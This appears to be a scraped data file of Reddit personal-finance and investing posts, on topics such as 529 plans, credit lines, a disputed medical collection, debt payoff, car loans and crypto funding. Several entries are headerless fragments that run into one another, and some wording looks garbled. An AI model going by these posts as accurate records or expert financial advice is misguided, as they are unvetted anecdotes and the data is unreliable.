Perhaps surprisingly, (almost) all 529 plans are controlled by individual states, even those offered through e.g. Vanguard, Schwab and  Fidelity.  Those states determine what owners can invest in and whether there are any unique tax benefits.  Note that in this article, I am limiting the discussion to generic investment accounts, as opposed to prepaid tuition plans that are offered by a few states.   Those are generally less useful choices, but you  could look into those for a full understanding of your options.  

(There is a closely-related plan called a 529A / ABLE plan for people with disabilities; this is outside the scope of this article, though.)  

- Tax advantages and benefits

For allowable education expenses, a 529 plan is Roth-like, in that  earnings are tax-free and don't even count as part of your income.  Used on other than allowable education expenses, distributed gains (but not contributions) are    taxable income,  also subject to a 10% tax penalty.  There are many ways to  work around that, but you may not be able to use them in every case.

Like a Roth account, there is no federal deduction for 529 contributions, but unlike a Roth, many states allow a state tax deduction for at least some 529 contributions to their own 529 plan, and a few offer a deduction to any plan.  A few offer no deduction.  [Here's a list.](https://www.savingforcollege.com/article/how-much-is-your-state-s-529-plan-tax-deduction-really-worth)

There is no hard federal annual or lifetime limit to the amount you can contribute to a 529 plan, though states have aggregate limits in the $250K-500k / beneficiary range, sometimes limit annual contributions, and you may have to do gift tax paperwork (but not pay gift taxes) if you exceed $15K /person / year.  You do not have to be the owner to contribute to a plan, so friends and family can contribute to a plan owned by someone else.  

One interesting wrinkle is: in some cases, if you are paying for your own college education, you can actually make your own 529 plan with you as owner and beneficiary, deduct your contributions on your state taxes and then immediately pay for school.  This only gives benefit when you get that state deduction, though. 

- Limitations and workarounds

The big limitation is the need for qualified education expenses.  What if your kid doesn't go to college, or you contributed more than you end up spending?   You would eventually be taxed and penalized when you withdraw the money.  Workarounds include: [changing beneficiaries](https://www.savingforcollege.com/article/how-to-change-the-beneficiary-on-your-529-plan) to another family member, even yourself; or using the money for other types of education expenses, e.g. that Tuscany cooking school vacation might be partially allowable in some cases.  

If your beneficiary gets a scholarship, you can use 529 money for allowable expenses beyond the scholarship, and also take the money out up to the value of the scholarship; gains used that way will be taxed though not penalized.  

A secondary limitation is  choice of type of investment.  Like a 401k, you can only invest in what your plan allows, and even more restrictively, you can only change occasionally, typically twice / year.  You will be subject to the fees charged by the plan, which are similar to 401k fees.   If you decide you don't like the 529 plan you selected initially, you can roll over to another 529 plan without any federal tax impact once / year.   Rollovers may affect your [state taxes](https://www.savingforcollege.com/compare_529_plans/index.php?page=compare_plan_questions&amp;plan_question_ids[]=87), though.  

- effect on financial aid

While a full discussion of financial aid is more than we can do here,  the [primary rules](https://www.savingforcollege.com/article/yes-your-529-plan-will-affect-financial-aid) about 529 plans are: money is counted as available asset for the owner, so would affect the expected family contribution if that is a parent.   In most  cases, if you have enough income to establish a significant 529 plan, your expected family contribution will be high enough anyway that  the 529 aid reduction effect will be minimal.  

One workaround when this is a concern: assets owned by grandparents are not considered family assets, though they will be counted as income to the student when spent, so best to use these only in later years.

- What should you do?

If you want to save for your children's (or other relatives...) college education, you can establish a 529 plan at any time, and contribute what you want to, either regularly or irregularly.   One observation is: people seem more willing to set those up when kids are young and adorable, as opposed to rebellious teens.  It doesn't generally hurt to contribute some money at an early age, but resist the urge to fully fund a 529 account before you determine  that your kid won't even go to college.  That happens, too.  

You definitely want to prioritize retirement contributions before making 529 plan contributions, since there are student loans but not retirement loans.    

Once you decide to make a plan, the actual choice of plan depends on where you live and what you think about the available options.  There are many many 529 plans, so you may want to look at third party review sites to get an idea of which plans would be best for your situation.  Here are a few examples of those:

My credit score is pretty good by most standards.  I'm in Canada and one report says it's at 800 points give or take which is ""excellent"".   My banking institution, one of them anyway, is offering me a LoC of $5,000.   I'm not sure why they offered me it or if I need it.   


I tried asking the agent on the phone to define the difference between a credit card and a LoC.  Both to me as the consumer/ spender is kind of the same as in, I""m spending someone elses money.  However, my understanding of this is a bit foggy.  Credit Cards while carrying a higher interest rate, usually 29%, a shot in the dark, have a grace period of 30 days.   LoC is calculated daily.  If I don't pay it off within a day, it's going to hurt.   To my mind, people who apply for LoC are doing so to buy big ticket items and not say, use it for a night on the town, or maybe they do, I'm not judging.   One thing the agent did say the benefit of LoC is that people who don't pay off the full amount and carry a balance are much more advantageous on a LoC because of the low interest rates vs a CC's.   I guess that makes sense.     


I just don't see why, personally speaking, would need it if I have a CC and I always pay off the debt before the end of the month ticks over.

So in short, LoC simply isn't designed for a person like me?",finance
personalfinance,Inaccurate collection dragging my credit,"Hi folks,

About a year ago, pre-COVID, my infant son needed surgery. It was performed at an outpatient surgery center by a third-party surgeon (i.e., surgeon did not work for the surgery center). In the week prior to the surgery, the surgeon's office and anesthesiologist's office both called to talk money, we agreed to the charges, etc... we never heard from the surgery center until the morning of the surgery, when we go to registration at 5:45am. We then learn that their fee is *15 times* that of either the surgeon or anesthesiologist (who are actually doing the work). They basically say, pay up, or you can take your kid home. Obviously, this paints us into a corner - probably by design - and we had no choice but to sign on the dotted line and swipe our Discover card.

After the surgery, as everything has finally percolated through our Aetna insurance, we review the EOBs and discover that not only did the surgery center charge the wrong CPT code for a procedure that was not performed, but they also billed it twice. Aetna assumes this is because the procedure was bilateral, but it wasn't, and the surgeon's claim doesn't show that. This is right around when COVID started and workforces were being squeezed: I could not get anyone at Aetna to care. We went through their appeals process and just got boiler plate letters saying ""well, the center *says* they did it, so we believe them and not you."" We also tried contacting the surgery center, but they're deliberately evasive: Their phone number does not allow you to speak to an agent, it only lets you pick options that will play preset information about how to arrive for surgery / COVID protocols / etc... E-mails to the administrator went unanswered.

At around the same time, we dispute the charges with Discover, who ultimately says that they kind of *have* to believe the merchant (I don't know if I buy that). The one thing Discover did throw us a bone on is that we were on a monthly payment plan with the surgery center. We had already paid two installments by the time we were getting this worsening news, but they were able to put a blockage in the system so that their further attempts to run the card would be declined.

This, of course, resulted in the account being sent to collections. Under the FDCPA, I immediately dispute the charges again. By the way, every time I'm interacting with one of these orgs - Aetna, Discover, the collection agency - I'm sending 20+ pages of supporting documentation, including statements *from the surgeon that say this was not a bilateral procedure.* Unfortunately, the surgeon is a third party and says he really has no control over the surgery center, and that this is our cross to bear. Anyway, as expected, within a day - way too quickly to do any reasonable inquiry - the collection agency responds saying that they spoke to their client, and not only do they agree with their opinion of the charges, but they also say the client has records that they spoke to me in March and that I understood and agreed to the charges. That absolutely never happened. I have never spoken to anyone who works in that building via phone or e-mail. I only ever spoke to them face-to-face on the morning of the surgery, where the charges weren't explained - it was ""You need to be back in the OR. You swiping your card or nah?""

I'm feeling quite exhausted at this point, as this has now dragged on for over a year. We have *impeccable* credit, and this collection on our report is really hurting our scores. It is literally the only blemish. We have never been so much as late with a single payment in the past. I realize that's a situation of our own making since we did ask Discover to put the kibosh on the future charges, but when the surgery center wouldn't communicate with me, and Discover and Aetna were more or less assuming that the billionaire surgery center is telling the truth, I wasn't left with much choice. I don't know where else to go from here.

It may be worth noting that we have pretty solid incomes. We *can* afford to just pay them off to get rid of this, but 1. I am too principled to pay something that is so clearly not actually owed and 2. My understanding is, at this point, paying the collection doesn't delete it from the report, it merely changes the balance. For those reasons, and since we could afford it, I've debated hiring an attorney to go after them and try to get this deleted via litigation, but I also know that the medical industry has unlimited resources and some of the best attorneys in the world at their disposal, so I feel like this is a losing battle, even if I wanted to pay someone $400/hour to tackle it. This may be wading into r/legaladvice territory, but from past experience, they'll stop reading at ""needed surgery.""

Open to any advice on where to go from here, since my options under the FDCPA and FCRA have been apparently exhausted. It seems that no one wants to give my 20-page complaint the time of day because reading is hard and they're short-staffed and/or just don't want to stand by their consumers.

**TL;DR Outpatient surgery center billed wrong and duplicate codes for surgery; Does not make a billing or coding department accessible/responsive; Aetna, Discover and collection agency all refusing to take my documentation which includes a statement from the surgeon that the CPT code is wrong; Resulting collection is dragging down my credit; Hard to find anyone to give a damn.**",finance
personalfinance,Help! Which debt to pay off with tax return?,"Hello all, long-time lurker and first-time poster. I need some advice as to which debt to pay down first. So a quick overview of where I’m at:

I have solid employment with an annual salary of about $130,000 give or take bonuses. I am approximately $75,000 in debt. 

$30,000 in student loans, 7% APR
$20,000 in two auto loans both at about 5% APR
$15,000 in a high interest rate emergency personal loan (28.8% interest, 33.3 APR)
$9000 in credit card loans (mostly 28% APR)

I had no personal loan or credit card debt at the start of last year but I got sick with Covid, had to leave my job and home suddenly. It took several months to get a new job but it didn’t even pay enough to cover my monthly expenses so I got a loan and used credit cards to bridge the gap over the past year. In February of this year I finally got another good job and now make enough to cover monthly expenses including $1200 in child support. 

Specifically I need help today to figure out how to start paying down my debt with my tax return and stimulus money.

I have $11,000 of tax return/stimulus to start paying down debt. My goal is to straighten out my debt and credit situation enough to where I can qualify for a home loan by the end of the year. 

I was thinking the biggest obstacle and highest APR is obviously the $15,000 personal loan and that should be my target (If I learned anything from lurking on this subreddit). The issue is, right now I would not have enough to pay it off completely unless I raided my emergency fund/savings ($4500). 

So my question is, would it make more sense to completely empty my bank accounts right now and pay off that $15,000 loan or should I pay off all the credit cards and use the left overs of about $3000 and apply it to that loan? (and maintain my emergency fund)

Minimum loan payment and total minimum credit card payments come out to about $800 each every month ($1600 total). 

Any advice is appreciated! Thank you so much and I will proactively admit I have not been financially literate or responsible, and that is how I ended up in this mess to begin with. Hoping to reverse that with your help today!",finance

personalfinance,Weird tax question,"My wife and I got married last year, but had residency and income in two different states for the entire year.

I feel like the only way we can file is married filing separately. Which would be fine, but I was a part time student and working for all of last year. If I claim my tuition, I'll get ~$700 more back on the federal return. Unfortunately you can only claim that tuition if you file jointly.

Unless I'm missing something, It seems to be impossible to file jointly federally and separately to each state.

I'm at a loss for how we can file our taxes correctly and me still get that tuition credit.

It seems due to reciprocity that we could claim her residency in my state and then her state would owe her a refund and we would owe my state some taxes, but then there's a late fee for my state. 

Does anyone know how to handle this?",finance
personalfinance,"A Non Profit has proposed a new Investment Strategy, and I am concerned.","I have been doing some volunteer work for a non profit that has accumulated some substantial funds over the past few decades. These funds were previously held in bonds and cash funds which basically has been earning negative interest rates as of late. 

Their investment committee has proposed their desire to invest portions into a Wells Fargo actively managed fund, which they claim will deliver a return on investment of 9% with only a 5% risk of loss. 

This proposed return of 9% seems awfully ambitious with only a 5% loss risk. Does anyone else feel this is too ambitious of a gain/loss balance?

Another issue is that they are proposing to to invest large chunks of their funds now. For rough figures let’s say they have 1.5M total, and they are proposing to invest 100k each month in this actively managed portfolio. To me, this seems that investing a lot at a time when the market is high, leaves no opportunity to invest over the long term range. 

People looked at me like I had a third eye, as they were hooked with the 9% growth statement. 

Finally, only fee would be a 0.6% of total investment value which is a management fee 

Does anyone have any thoughts on this? Perhaps I’m looking to be too conservative when it comes to non profit money.

stocks,First time DD - Coursera,"Hey guys, so I'm considering investing in Coursera but I'm curious what I should be looking for to determine if its a good buy or not. 

At its core, I think it's a great idea. The pandemic has illustrated that many schools can move to an online platform and make advanced learning both cheaper and more accessible. I can personally atest to this as I learned how to program and received a programming job as a direct result of one of these online courses. 

Here's what I know: 

- Coursera has diversified its income streams to include both direct to customer, enterprise business, and federal aid. 
- They added roughly 30.6 million users during the pandemic; while obviously this level of growth can not be maintained, i believe firmly that this will still lead to growth as a result of the 'network effect.

-They have not turned a profit yet, but their profits have grown from 184 million to 290 in 2020. However, other companies in the 'tech' industry also takes years before becoming profitable. 

-Their headquarters maintains a professional environment (a bit shallow but hey I want to at least make sure that they aren't running out of a guys garage).

personalfinance,Looking to buy a new/certified car,"Long winded post incoming…

I’m looking for a little advice, or just general tips on our situation. My girlfriend (22) and I (23) are looking to replace our cars. To set the stage, I’m one year graduated and have been working as a Civil Engineer making about 62k gross. My girlfriend is also one year graduated from an associates nursing degree and is simultaneously working as a nurse and doing RN to BSN program online, making about 58k gross. Therefore our combined income annually is about 120k, or (very roughly) 80k net. Our monthly expenses (rent, grocery, utility, insurance, occasional eating out, unnecessariness etc.) is about 2k, or 24k annually. This does not account for investments or student loan debt payments. We do not currently make car payments.

As of writing this, I have about 24k cash. 12k of which is in emergency savings. Roughly 8k invested between a 401k (about 3% company match) and personal investments, starting last June. I’m currently investing approximately 15% of my gross income, at a rate of about 400/mo, roughly. I have about 48k in student loan debt, all federal. Since these have been deferred (payment and interest) until October, I haven’t paid a dime toward those and don’t plan to until then, however, I’m estimating that my monthly will be about $500 for the first few years, ramping up gradually after that. Monthly necessary bills are about 1k, as we split all bills right down the middle. My monthly take home is 3200, and if we subtract deductions, that leaves about 1300. To be conservative, lets say right now I take home 1000 after everything (including projected loan payments), or 12k a year.

My girlfriend is in an extremely similar boat as me (exact same in cash), however, she has not began investing quite yet, and only has about 15k in student debt. She is planning to pay for her BSN as she goes, which is a tougher number to estimate, but the point is she’ll be paying in lumps each semester in the area of 1-4k depending on credits. After we get her started with investing, and considering the higher up front cost of schooling, lets also say she takes home about 1000 a month, or about 12k a year.

Renting/buying market in our area right now is so hot that our 1,400/mo rent is actually competitive, and homes are selling WAY over asking price. We are also unsure that this will be our “settle down” city to live, as we are not from here, so lets assume we are not targeting to buy a home or move within the next 12/18 months.

She drives an ’07 Hyundai Accent, which not only is it pretty unsafe, but has been nothing but has been a constant repair hog. I drive an ’04 VW Passat wagon, which has also cost me a lot of time and money to repair. We have owned our cars for 5+ years each.

We are both looking at cars, new or certified in the 20-25k range. Leaning toward Mazda. Under no circumstances would we ever consider leasing. I assumed that private value for both of our cars would be 2k each, and reasonably we can put down 6k now, which is about half of our non-emergency cash. Whether it be 0%APR (new) or max 5%APR (used), the range for monthly payment would be about 250-350/mo payment, plus insurance. This leaves both of us at around 650-750 super conservative take home each month, assuming everything stays constant. Back of the napkin says each of us would gain about 8k cash each year with this approach.

Is this unreasonable? I know as soon as I mention “new car” heads will turn, but for what it’s worth, we take very good care of our cars and have zero accident history. While I know we could be looking cheaper/older, the whole reason we are looking to move on is that we are tired of repairs, and would like to go on longer trips without worrying about calling tow trucks. I don’t want to be getting a cheaper car (10-15k, 5-10yrs old) that would already be at that age/condition that could start having major repair issues outside of brakes/tires/oil changes/etc, which defeats the purpose of upgrading in the first place. Bottom line is our cars are not very reliable anymore, generally unsafe and not very economical due to mpg and repairs.

So while we are both working 50-60 hours some weeks, she is in school, we think that our only option, if we upgrade at all, is that we go new-relatively new car so that the next 3-5 years will be care free, for better or for worse. While I know I'll get plenty of ""just buy a junker to beat around in and save you money"", that's what we do right now, and frankly it's not working out. Outside of pure numbers, sometimes you can't put a price on safety and peace of mind. I know it’s not financially optimal, but I’d love to know what your opinions would be on this plan to get another perspective.

Thanks!",finance

My payments are roughly $214 but I have been making payments of $415 the last couple of months. If I am trying to pay it off as soon as possible and save the most amount of money, should I put the 7k towards it right now? Or should I wait until I can afford to pay off the balance outright?

personalfinance,403b rollover to IRA to pay for college?,"Hello fellow redditors! I am a nursing student enrolled in an accelerated program and I am supposed to graduate December 2021. I’m trying to figure out the smartest way to utilize the money I have while avoiding taking out private loans (I am only eligible for $12,500 in federal loans per year). I am not working due to the nature of the program (they told us not to work, and most of the people who are working have already failed out of the program). Here is a little background on my finances...


I currently have a 403b(pretax money)worth about $19,000, that I started contributing to in 2013. I inherited some Intel stocks and have about $40,000 worth of those stocks. Intel is slowly climbing and I feel that I don’t want to cash out any of those stocks just yet. 

So the question is, If I rolled my 403b to an IRA would I be able to take the money out for school expenses without a penalty(or a minor penalty)? I figured out I would need about $20,000-$22,000 out of pocket to pay for the rest of school. Im thinking if I did find a way to cash out the 403b or roll it over, I would be able to quickly make that money back within my first year of nursing. And I would honestly rather spend the 403b money, and as little of my stocks as possible because of the potential for growth. If anyone has advice I would greatly appreciate it!",finance

financialindependence,$500k: A 10 Year Milestone,"I graduated college ten years ago next month so I thought it'd be good to look back and do a deep dive on where I've been vs where I'm at now. Coincidentally, I'm also hitting the $500k net worth milestone.

For TL;DR here are the numbers first. For anybody that cares, below is my story.

34 years old, married, in MCL in midwest. Below are my income numbers but our net worth values.

**Income / Net Worth**

* 2011: $54,000 / -$18,000

* 2012: $64,375 / -$6,000

* 2013: $64,375 / $0

* 2014: $72,000 / $10,000

* 2015: $72,000 / $16,000

* 2016: $95,000 / not tracked???

* 2017: $95,000 / $57,500

* 2018: $110,000 / $183,000

* 2019: $115,300 / $272,600

* 2020: $128,300 / $304,00

* 2021 (to date): $138,900 / $500,000




**My Major Takeaways:**

1. Don't settle or get comfortable in your current role. Be aggressive in proving yourself to be a highly valuable asset. Nobody just hands out money and sometimes we have to take a calculated risk to better the future.


2. Start saving earlier. I wish I had started while in high school. I did some great things like paying off student loans ASAP, but I still feel well behind where I want to be. It's especially hard when seeing Crypto and GME millionaires all over Reddit. But I know I'm still doing better than most.


3. The snowball effect is very real. Every little addition to the savings adds up, but time is your best friend for savings accumulation. I can't believe how much my net worth has grown over the past year.

4. Even ""zero cost"" refinances actually have costs. But when looking out long term, it can still make sense.




**My Story:**

I graduated college in 2011 after spending a couple extra years to obtain a BS in mechanical engineering. I worked full time for a few years during college but still apparently pissed away all money that I brought in. However, due to significant scholarships, I graduated with ""only"" around $12k in student loans.

I got a ""real"" job post graduation making $54k salary in fall 2011 then a few months later accepted another offer at a different company for sightly more money. I moved back in with my parents and started aggressively paying off the student loans. I'm not really sure what the drive was to pay them off other than I knew I didn't want to pay significant interest over decades. By the end of 2012, I had paid off all student loans, paid off a way too expensive engagement ring, paid for a nice all inclusive honeymoon, got married, and moved into an apartment with my bride. I realize it was a combination of both good and bad financial decisions but I wasn't quite at the financial intelligence level that I feel I am now.

After paying off our $6k vehicle, my wife and I saved up $10k and purchased a $165k house in 2013. It wasn't a 20% down payment so we had to pay PMI. Our interest rate was 4.75% and I paid extra each month to build equity and remove the PMI faster.

During this time, she was making around $25k annually to my slow increase in pay. But...


**Job Changes:**

The company that I worked at wasn't in the best financial health and that definitely impacted my income. At least two distinct years during my tenure nobody received a merit increase at the company. However, I took matters into my own hands and obtained competing offers with other companies.

Looking back, I was able to do this gambit because I always outperformed my peers-- I always made myself available 24/7 and took on and succeeded in all projects. I literally mean all projects. Even though I was only fresh out of college, I would be managing all Capex projects for the site because I wouldn't wait for someone to be assigned the project. I would just grab the horns and run. This made me the go-to guy and highly liked by both local and corporate leadership.

The first time I got a competing job offer in 2014, I negotiated a 12% raise and kept the same job at the current company. The second time in 2016 I did even better with a full promotion to a management position with the same company but in a different state and with a 24% raise. My wife and I always considered it a stepping stone because we wanted to eventually move back to be nearer to family. She also became a stay at home mom to our 1 year old as part of this pay increase, which essentially was actually a net zero increase due to her loss of income.

As part of the move, I signed an agreement to reimburse the company for relocation expenses they paid to move my family (house sale, house purchase, hotel room, etc) if I left the company before two years passed. Our first house sold for about $10k more than we purchased it for.

In the new state we purchased another house in late 2016, this time for just under $200k with 20% down using the proceeds of the first house plus a small signing bonus. Even though the house cost more, the new interest rate was much lower at 3.1%, which actually lowered the monthly payment. This is also around the time that I really started buckling down to track our finances and start investing for FIRE. I think it started when looking at the finances of the new house.

In 2018, after about a year and a half in the new role, an opportunity came up at another company back in the city where we were originally from. I accepted the new job at a higher salary and again relocated my family but this time back ""home"".

With changing companies after less than 2 years, I owed the first company approximately $12k in remaining relocation expenses. However, I negotiated with the new company to pay an additional $20k bonus to cover these costs. I stated during the negotiations that I didn't yet have the full figure so ballparked it at $20k and that I couldn't accept the position without help repaying the old company. At the same time, I convinced the old company to forgo the reimbursement as I was leaving on good terms and was also hired by them on contract basis to do some minor contract work on the side.

Before moving back home in 2018, we sold our house for about $20k over what we paid. Between this, and the additional bonus, we purchased a new house in our home city for $265k with $90k down payment. The goal was to stay sub-$200k, but housing was incredibly expensive and we had to make a quick decision as we were living in a hotel. It was a decision that hurt financially, but one that we've been able to absorb nonetheless. Our interest rate was 4.375%.

In 2019, we had another child and since then my wife has continued to be a stay at home mom.

At the beginning of the pandemic in March 2020, when interest rates took a heavy drop, we refinanced the house down to 3.875% for around $3k in closing costs. Our mortgage company contacted again this year offering a ""zero fee"" refinance option so in March 2021 we refinanced again. The closing costs were about $2k and our new rate is 3.125%. I know that we could have gotten even lower had we paid points or done a full refinance with a different company, but I think our money is better off elsewhere now. Although our payment length has stayed the same (~28 years left) and our mortgage payment is lower, taxes and insurance have increased which has negated any immediate benefit of the refinance. But we'll still save in the long run over the total paid for house.

Now I have again proven myself a valuable asset to my current company. Unfortunately, this can sometimes be a negative-but-still-good thing: in less than three years, I have maxed out the pay the company is willing to give me for my current job description. I've convinced my direct manager to change my job description because I have again acquired additional projects and responsibilities in an effort to again be the ""go-to"" guy. I'm hopeful that I'll be given a promotion within the next couple of months...else I'll have to start looking for another position to continue moving up...


**So now 10 years after graduating college:**

personalfinance,Can/Should I do a backdoor Roth?,"I currently don't work and do not receive unemployment, therefore have no income and basically only pay Federal income tax on my investments and interest. However, I do live in a high income tax state (OR ~10%). I do have Traditional IRA investments and wonder if it's worth doing a backdoor Roth as my current tax situation will probably never be lower. I am also unsure if I can do a backdoor Roth if I don't have any current income. I do plan on moving to a lower income tax state in the future, but not to a no-income tax state. At that time my earning status also may be different, who knows. Should I do a backdoor Roth?

Edit: I now understand a Backdoor is not just a conversion. So slightly different question: Is it worth converting some of my IRA to a Roth IRA since my taxes will probably never be lower?",finance
personalfinance,Best way to optimize credit cards?,"I have one credit card I use for all activities, a relatively low-interest rate card I received through my bank. I recently lost it and had to have it canceled and replaced, and in that time I had no way of paying for expenses like groceries other than my debit card (I have a virtual Apple Card but it doesn't apply to my grocery store and also has a ridiculous rate for non-Apple purchases). It was only for two weeks, but I realized then that I needed a second card to cover the loss of one of them. I recently applied for and just received a second card, a Citi Double Cash rewards card.

My old card (Card A) has 16.99% APR, no rewards or fees, and currently a \~$700 balance on a $8000 limit. I am steadily working on paying off this balance via YNAB.

My new card (Card B) also has a 16.99% APR, 2% rewards (1% in buying and 1% in paying off, no limits on categories like ""groceries"" or ""travel"") but no fees, and has yet to be used.

Since the APRs are the same, should I start billing everything on Card B to maximize rewards and just pay off Card A's balance? Should I only put some purchases (ex: recurring expenses like my Amazon Prime subscription) on Card A and keep variables on Card B? Am I overthinking this?",finance
personalfinance,Student loan debt and savings,"Hi everyone! I'm looking for some starter advice on how I can be more proactive financially. 

I’m 28, living in CA. I work in education and make about 55k a year. I spent my 20’s in school so this my first job that actually makes me think about saving. Currently I’ve got about 5 months salary in savings, 80k in student loan debt (government loans) and about 9k leftover in student loan money that I didn’t end up using for school. 

I am planning to move in the next couple of months and my partner and I want to get married in the next \~2 years. I also would like to pay off my student loans, buy a house, and save for retirement but those are some longer term goals. I have a basic retirement plan through my employer and they match the contribution. My student loans interest rates range from 5-6%. I’m already on an income based repayment plan and due to the pandemic payments and interest have been halted until at least September.

Barring any major life crises, my inheritance should take care of my student loan debt but I want to know what to do in the meantime to work on it myself and save for some of my other goals. My partner and a couple of friends have suggested looking into index funds but I'm admittedly a little clueless about it. I've started doing some research on my own but would appreciate any advice specific to my situation. 

I’m living and working from home during the pandemic so I’ve been able to use this time to save money but I plan to move soon which will increase my monthly expenses by quite a bit. What steps can I and should I take to get started towards these goals? Any advice is greatly appreciated!",finance
personalfinance,Could I be doing more with my savings?,"I'm looking for some advice. I'm 27 and until 2 years ago, I was either working in very low wage jobs or doing volunteer service. Now that I've been in a stable salaried job for 2 years, I've had a learning curve on how to treat my savings and could use some advice. 

I'm familiar with the money flowchart and have been following it mostly but I have questions about how to better make my savings work for me. 

Here's where I'm at: 

Earnings: I currently make 47k a year plus $1,500 in an HSA prefilled by my employer. 

Expenses/Debt:
My average expenses are $1,300/month. Right now, I have 14k in federal student loans (low interest), and I own my own car outright. No other debt. I'm intentionally not paying off my student loans right now because of the 0% interest and the temporary forbearance due to covid. 

Savings:
I've been saving about 2k per month on average. Right now, I have 12k in a roth IRA (maxed for 2020 &amp; 2021) and 32k in a HYSA (2% interest).

This is where my question comes in. The HYSA and roth IRA are changes I made this year but I feel like I could be doing more.

I've been reading about CD ladders but they dont seem to be better than my HYSA. I'm also hesitant to invest in a 401k at this point because my work does not offer matching and I may want that money liquid enough to invest in a house in the next few years. I've also been pretty miserable in my job for about a year and have been contemplating a career switch, so I want flexibility in my savings if I want to go back to school or take a lower paying job. 

My main question is if there is something better I can be doing with the 32k I have in my HYSA based on my situation?",finance
stocks,"Here is a Market Recap for today Tuesday, April 13, 2021","**PsychoMarket Recap - Tuesday, April 13, 2021**

Stocks traded mixed on Tuesday, with the S&amp;P 500 (SPY) and tech-heavy Nasdaq (QQQ) gaining while the Dow Jones (DIA) fell modestly. Market participants are closely monitoring the pace of vaccine distribution after US federal health officials called for the pause in the rollout of the Johnson &amp; Johnson (JNJ) coronavirus vaccine and the upcoming earnings season.

In a joint statement posted to Twitter [(check out the thread here](https://twitter.com/US_FDA/status/1381925612743499778)), The US Food and Drug Administration (FDA) and the Center for Disease Control and Prevention (CDC) called for a pause in the rollout of the JNJ vaccine following reports of rare blood clots in people who received the vaccine. The agencies are reviewing data over six reported U.S. cases of a severe blood clot in individuals after receiving the vaccine, and have recommended the pause ""out of an abundance of caution,"" the FDA said in a Twitter post. To date, roughly 6.8 million doses of the single-dose JNJ vaccine have been administered.

In a statement, JNJ said it has been “working closely with medical experts and health authorities, and we strongly support the open communication of this information to healthcare professionals and the public” and added “In addition, we have been reviewing these cases with European health authorities. We have made the decision to proactively delay the rollout of our vaccine in Europe.” During a press briefing, Dr. Anthony Fauci, director of the National Institute of Allergy and Infectious Diseases, said the J&amp;J vaccine review would likely take “days to weeks, rather than weeks to months”, in order to resolve.”

As earnings season kicks off, a slew of recent promising economic data has suggested corporate profits will jump in tandem with the recovering economy, especially in the sectors most heavily affected by the pandemic. Over the past several weeks, analysts have raised their earnings estimates by record levels with the expectation that recent economic growth will drive corporate earnings higher. According to FactSet, first-quarter [earnings estimates were increased by a record margin of 6%](https://insight.factset.com/record-high-increase-in-sp-500-eps-estimates-for-q1) over the past several weeks, as analysts adjusted their forecasts for the much stronger-than-expected economic rebound seen so far.

I'm asking because sometimes when I look up the daily volume of trades for some of these it is zero. I don't understand that. Are they liquid? What does NAV mean? One website will give the 7-Day interest and then another website will say that the interest, also called dividends, will be paid quarterly for the exact same fund. Does that mean you need to leave it in 3 months to get your interest? Supposedly they are riskier but pay more income than some other fixed income assets.

personalfinance,Bonds in taxable to rebalance?,"Hi all,

Current portfolio is ~$[low seven figures] with roughly 17% in tax-advantaged accounts (all in target-date retirement funds) and the remaining 83% in a taxable account. I currently max out my 401(k) w/ 50% employer match, all going into the target date fund (which is like 55/35/10 US equity/intl equity/bonds).

I recently received a windfall that is roughly 1.5x the size of the existing portfolio, after taxes. Right now my only bond exposure is through the (relatively miniscule) bond holdings inside of the target-date funds in the tax advantaged accounts. I'm planning to put the entire windfall into the portfolio and I'd like to use a portion of it to fix up my bond allocation and get closer to 90/10 or even 80/20.

I'm struggling with how to get there. First, even if I shifted my 401(k) allocations to only buy into bonds moving forward, it would still take many, many, many years to rebalance to 90/10. While this would be quicker, it would still take many years if I *liquidated* all of the tax-advantaged holdings into bonds (I don't even know if that's insane in the first place?) and shifted the allocation the same way moving forward. So, there doesn't seem to be a way to do this in my tax-advantaged account.

The next issue is that I'm in the highest federal tax bracket and live in a high tax state/locality. So holding bonds in my taxable account seems like not a great idea, unless I use tax-free bonds. So the question really is: is it a bad idea to have my *entire* bond allocation in tax-free bonds in my taxable account? That seems particularly risky if they're all munis in the same state, no? What are my other options? A combination of that and some other tax-free bonds, or something else? How should I approach thinking about this and allocating those choices within my larger bond allocation?

A few more things to note. The non-bonds are all going into two low-cost index funds, split roughly 60/40 US vs international. I'm a single-filer, late 30s, and my only debt is a mortgage around $1M at 2.75%. Someone elsewhere suggested paying that off (which I'm reluctant to do), or at least *some* of it, and treat the equity as the equivalent of bonds given my situation. Thoughts?

CryptoCurrency,Ways to invest in Crypto without losing your shirt,"So it’s come to my attention that there are a lot of people taking a lot of very dangerous risks and leverage to buy into this crypto bull, and I thought it might be helpful to the community to put out some ideas in order truly give people “money they are willing to lose,” support.  Here are some great ways to make money to invest in Crypto WITHOUT taking out a loan, using a credit card, committing insurance fraud, etc.

TAXES - 

Claiming 0 on your taxes is a great strategy if you want to use your return to fund your crypto purchases.  This allows you to get the most taken out and will result in a hefty return during tax season.  (You can also claim more than zero and DCA in with your bigger paycheck, but be mindful that you don’t owe.)

Donate items to charity.  You can use an appraisal of the items you donate.  Even through the standard deduction will probably stop this from effecting your federal taxes, you will get a decent extra chunk back in your state taxes.  Just make sure to keep those receipts!

Selling Junk:  

Clean out your garage.  Sell that vintage lawn gnome you hate.   Put your old baseball cards on eBay if it’s a common series (unlikely to appreciate.)

Sell your old phones: you probably have a dozen lying around the house..  you’d be surprised what you can get for an old phone.

Cut out one coffee/ impulse meal once a week.  Keep a running tally of what you saved.  DCA in.

Quit smoking.  If you are a smoker, you are blowing away tons of money that could be making you rich long term.  And hey, there’s that whole health thing. :)

Quit drinking.  Yup, you heard me.  Easier said than done I know, same as the last one.  But not drinking Pabst today could have you drinking champagne down the line.  

Replace paper towels with wash rags.  You heard me. It’s better for the planet and it’s much, much cheaper.

Deliver:  we live in a gig economy.  Delivering food is easy, anyone with a car can do it, and it pays surprisingly well and you make your own hours.  A couple of hours a week a year ago invested directly into ethereum would have made that delivery job the money doctors make.

Take advantage of rewards programs:  lots of credit cards have points systems that let you trade your points for Gift cards.  Always pay your card monthly in full and you’ll end up ahead.  I myself have gotten at least 12 $500 Home Depot cards over the years with a Cap one card that costs $39 a year to keep active.  That’s $6000 I would have put into my house with cash.  That’s money instead I can use for other things.

These are just some ideas; feel free to leave more here!",cryptocurrency

personalfinance,I'm buying land and debating between paying cash to get a $1k discount or financing a portion for greater current investment opportunities.,"I've vetted the land and the seller. It's a great opportunity and I'm really excited about it. The land is $44k and provides full kingdom rights. It is in part an investment, but also an opportunity. It isn't in my immediate area (at all), but I have lived there and could see myself with a part-time house there in the future (15+ years). Its a great community and surrounding area. It is tax free, though there are HOA fees that may get up to $100/year. In the past 5+ years there have not been any fees above ~$20/year.

